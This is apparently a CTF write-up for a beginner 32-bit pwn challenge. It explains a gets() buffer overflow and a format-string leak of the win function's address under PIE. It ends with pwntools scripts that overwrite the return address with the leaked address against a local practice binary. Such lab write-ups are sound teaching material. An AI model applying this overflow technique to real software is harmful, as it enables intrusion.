# Writeup
## NRF24 CTF
## Challenge Name : New Start

- Lets checksec the file first.

![image](https://github.com/user-attachments/assets/bbd3daa9-c779-4335-8209-30b9f39d6d64)

### Analysis

We have PIE enabled here PIE stands for Position Independent Executable,
which means that every time you run the file it gets loaded into a different memory address. 
This means you cannot hardcode values such as function addresses and gadget locations without finding out where they are.

After running the file sevarel time we got some leaks and everytime its different so you know now why these are different .

![Screenshot from 2024-10-23 21-34-20](https://github.com/user-attachments/assets/1730cf7f-3ab9-4c9c-845a-fe2bf4ec1b10)


Luckily, this does not mean it's impossible to exploit. PIE executables are based around relative rather than absolute addresses, meaning that while the locations in memory are fairly random the offsets between different parts of the binary remain constant. For example, if you know that the function main is located 0x128 bytes in memory after the base address of the binary, and you somehow find the location of main, you can simply subtract 0x128 from this to get the base address and from the addresses of everything else.


### First thing first Lets check in Ghidra :


![image](https://github.com/user-attachments/assets/87eb574d-a0a7-44b7-8167-e73c87d1c7a3)

There are 2 vulnersbilities :

1. Buffer Overflow 
2. Format String

## 1. Buffer Overflow Vulnerability

The buffer overflow vulnerability in the provided C code snippet arises from the use of the `gets` function, which does not perform any bounds checking on user input. Let's analyze this in detail.

### Code Context

The relevant part of the code is:

```c
char local_28[32];
gets(local_28);
```

- `local_28` is defined as an array of 32 characters. This means it can store up to 31 characters plus a null terminator (`\0`).

- The `gets` function reads a line of input from standard input (stdin) and stores it in the buffer `local_28`.

- **Critical Flaw**: `gets` does not check the length of the input. If a user inputs more than 31 characters, it will overflow the buffer.

run ```man gets```

![image](https://github.com/user-attachments/assets/44204c32-5e3a-4f2c-806d-67f3635c3eed)


## 2. Format String

The string ```"I'm a newbie in CTF, and this is my first PWN challenge. What am I getting myself into: %p\n"``` serves as the format string.
The **%p** format specifier within this string is specifically designed to print a pointer value (an address in memory).
In our case its leaking the **win** functions adress

so now you know u r getting the win,s adress

![image](https://github.com/user-attachments/assets/9ef4c224-e2c2-41f9-998a-e58fe9c80430)






**SO how its going to help us ?**

Ans : First we will overflow that stack and put the adress of the win function , it will popout as a flag . :)



- Lets Break it down :


![image](https://github.com/user-attachments/assets/4ec00086-6450-4ee6-80b5-4798a74ab285)

- Its a 32-bit LSB pie executable file .

#### Memory Layout in 32-bit Architecture
In a 32-bit system, pointers and addresses are 4 bytes long. The memory layout of a stack frame typically looks like this:
```
+---------------------+
|  Return Address     |  <- 4 bytes
+---------------------+
|  Saved Base Pointer  |  <- 4 bytes
+---------------------+
|  Local Variables     |  (variable size)
+---------------------+
|  Buffer              |  (buffer size, e.g., 32 bytes)
+---------------------+

```

Here we have to over flow all these so that we can put our leaked win functions address.
```
User  Input: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" (40 bytes)

Stack Before Overflow:
+---------------------+
|  Return Address     |  <- Original return address 
+---------------------+
|  Saved Base Pointer  |  <- Original base pointer
+---------------------+
|  Local Variables     |  <- Local variables
+---------------------+
|  Buffer              |  <- 32 bytes for user input
+---------------------+

Stack After Overflow:
+---------------------+
|  Overwritten Address |  <- New return address (win)
+---------------------+
|  Overwritten Base Pointer  |
+---------------------+
|  Local Variables     |  <- Potentially corrupted
+---------------------+
|  Buffer              |  <- Filled with "AAAAAAAA..."
+---------------------+

```


- Now You know what to do right?

- lets use another ezz method to find the overflowing value using **gdb**

- create cyclic patterns

![image](https://github.com/user-attachments/assets/7fc990c7-63f8-4543-8a96-c421fd06e96c)

- run and input the created pateerns 

![image](https://github.com/user-attachments/assets/c83c1a06-8c9d-4957-8a31-ce793a6345cc)

- find the offset value from EIP

![image](https://github.com/user-attachments/assets/16124415-3629-4efa-91b1-7b67032a5df7)



#### Its time for scripting :

for normal return to win pwn u can easily  get the flag using this type script 

```py
from pwn import *

elf = ELF('basic')
io = process('./basic')

payload = cyclic(40)+ pack(win_address)  

io.sendline(payload)
io.interactive()
```
But as we knw the adress of win is not fixed so we have to grep the win adress as well we have to overflow and put the adress in 1 run.

so the final script :

```py
from pwn import *

elf = ELF('basic')
io = process('./basic')

data = io.recvline()
data_str = data.decode('utf-8')  # Decode the bytes object to a string
leaked_address = int(data_str.split(':')[1].strip(), 16)   # received data to extract the leaked address

payload = cyclic(40)+ pack(leaked_address)   #info address win 

io.sendline(payload)
io.interactive()
```

![image](https://github.com/user-attachments/assets/de41ffad-5c11-4161-a429-e566b4efe458)
